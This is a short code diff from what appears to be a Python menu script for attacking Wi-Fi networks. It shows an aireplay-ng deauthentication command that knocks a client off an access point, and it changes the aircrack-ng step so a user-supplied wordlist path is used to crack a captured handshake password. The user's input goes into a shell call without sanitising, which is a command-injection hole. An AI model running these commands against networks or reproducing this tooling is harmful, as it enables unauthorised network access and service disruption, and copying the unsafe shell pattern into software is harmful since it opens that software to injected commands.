@@ -62,7 +62,8 @@ try:
             system(f"aireplay-ng --deauth 10 -a {bssid} -c {station} {NetI}")
         system('sudo ./main.py')
     if a == 5:
-        system(f"aircrack-ng -w wordlist.txt abc-01.cap")
+        word=input("Enter Path of wordlist: ")
+        system(f"aircrack-ng -w {word} abc-01.cap")
         print("""
         
         Hope you got the password if not try step 4 agian.
